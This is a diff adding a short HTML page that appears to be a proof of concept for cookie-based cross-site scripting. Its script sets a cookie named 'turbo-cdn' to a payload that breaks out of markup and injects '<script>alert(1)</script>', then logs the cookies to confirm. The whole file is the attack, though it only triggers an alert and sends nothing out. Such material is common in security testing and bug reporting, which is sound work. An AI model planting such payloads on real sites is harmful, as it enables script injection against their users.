@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    // Function to set cookies with XSS payload
+    function setCookie(name, value) {
+      document.cookie = `${name}=${value}; SameSite=None; Secure; Path=/`;
+    }
+
+    // Set the cookie with XSS payload directly
+    setCookie('turbo-cdn', 'XSS"><script>alert(1)</script>');
+
+    // Optionally, you can log the cookies to verify
+    console.log('Cookies:', document.cookie);
+  </script>
+</body>
+</html>
